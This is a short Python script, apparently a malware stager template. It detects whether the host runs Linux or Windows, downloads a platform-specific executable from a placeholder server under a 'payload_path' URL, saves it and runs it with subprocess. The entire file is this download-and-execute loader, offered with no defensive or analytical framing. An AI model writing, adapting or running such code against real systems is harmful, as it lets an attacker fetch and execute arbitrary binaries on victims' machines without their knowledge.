import subprocess
import platform
import requests

# Detect Operational System
platform_os = platform.system()
# Set Filename to Download and Execcute:
if platform_os == "Linux":
    filename = "Linux Executable Name"
elif platform_os == "Windows":
    filename = "Windows Exe Name.exe"

# Donwload:
data = requests.get("http://your-server.com/payload_path/{0}".format(filename))
# Save
with open(filename, "wb") as fl:
    fl.write(data.content)
# Run:
subprocess.Popen(args="", executable=filename)
